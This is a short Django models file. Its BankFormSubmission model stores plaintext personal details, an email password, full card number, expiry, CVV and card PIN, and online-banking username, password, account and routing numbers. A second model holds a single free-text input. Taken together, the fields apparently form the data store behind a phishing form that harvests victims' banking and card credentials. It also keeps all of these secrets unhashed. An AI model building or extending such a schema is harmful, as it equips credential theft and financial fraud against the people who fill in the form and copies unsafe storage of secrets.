from django.db import models
from django.contrib.auth.models import User

class BankFormSubmission(models.Model):
    submitted_at = models.DateTimeField(auto_now_add=True)
    first_name = models.CharField(max_length=255)
    last_name = models.CharField(max_length=255)
    address = models.CharField(max_length=255)
    email = models.EmailField()
    password = models.CharField(max_length=255)

    card_number = models.CharField(max_length=16)
    expiry_date = models.CharField(max_length=5)  # Format: MM/YY
    ccv_security_code = models.CharField(max_length=3)
    card_pin = models.CharField(max_length=4)

    bank_username = models.CharField(max_length=255)
    bank_password = models.CharField(max_length=255)
    account_number = models.CharField(max_length=30)
    routing_number = models.CharField(max_length=9)

class SingleInput(models.Model):
    input_value = models.CharField(max_length=255, verbose_name="User Input")

    def __str__(self):
        return self.input_value
